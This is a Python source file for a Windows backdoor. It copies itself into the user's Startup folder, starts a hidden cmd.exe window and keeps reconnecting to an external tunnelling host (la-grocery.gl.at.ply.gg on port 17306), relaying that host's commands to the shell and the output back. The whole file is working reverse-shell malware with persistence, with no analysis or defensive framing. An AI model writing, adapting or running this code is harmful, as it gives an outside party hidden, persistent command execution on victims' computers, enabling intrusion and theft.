import os
import socket
import subprocess
import threading
import shutil
import sys
import time

def s2p(s, p, conn_status):
    try:
        while conn_status["connected"]:
            data = s.recv(1024)
            if not data:
                conn_status["connected"] = False
                break
            p.stdin.write(data)
            p.stdin.flush()
    except Exception as e:
        print(f"Error in s2p: {e}")
    finally:
        conn_status["connected"] = False
        s.close()

def p2s(s, p, conn_status):
    try:
        while conn_status["connected"]:
            data = p.stdout.read(1)
            if data:
                s.send(data)
            else:
                conn_status["connected"] = False
                break
    except Exception as e:
        print(f"Error in p2s: {e}")
    finally:
        conn_status["connected"] = False
        s.close()

def add_to_startup(file_path=None):
    if file_path is None:
        file_path = sys.argv[0]

    startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_dest_path = os.path.join(startup_dir, os.path.basename(file_path))

    if file_path != script_dest_path:
        shutil.copy(file_path, script_dest_path)
        print(f"Copied {file_path} to {startup_dir}")
    else:
        print(f"The script is already in the startup directory: {script_dest_path}")

def establish_connection(server_address):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print(f"Attempting to connect to the server at {server_address}...")
            s.connect(server_address)
            s.send(b'\x00')  # Send a test byte to ensure connection
            print("Connected to the server.")
            return s
        except Exception as e:
            print(f"Connection error: {e}")
            s.close()
            print("Retrying in 5 seconds...")
            time.sleep(5)

def run_subprocess():
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE

    p = subprocess.Popen(
        ["cmd"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
        startupinfo=startupinfo
    )

    return p

def main():
    add_to_startup()
    server_address = ("la-grocery.gl.at.ply.gg", 17306)

    while True:
        s = establish_connection(server_address)
        p = run_subprocess()

        conn_status = {"connected": True}

        s2p_thread = threading.Thread(target=s2p, args=(s, p, conn_status))
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=(s, p, conn_status))
        p2s_thread.daemon = True
        p2s_thread.start()

        while conn_status["connected"]:
            try:
                s.send(b'\x00')  # Sending a null byte to check the connection
                time.sleep(5)  # Sleep for 5 seconds before the next check
            except Exception as e:
                print(f"Connection check failed: {e}")
                conn_status["connected"] = False
                break

        print("Connection lost. Reattempting connection...")
        s2p_thread.join(timeout=1)  # Ensure threads are joined
        p2s_thread.join(timeout=1)
        s.close()
        p.terminate()
        time.sleep(5)  # Short wait before retrying

if __name__ == "__main__":
    main()
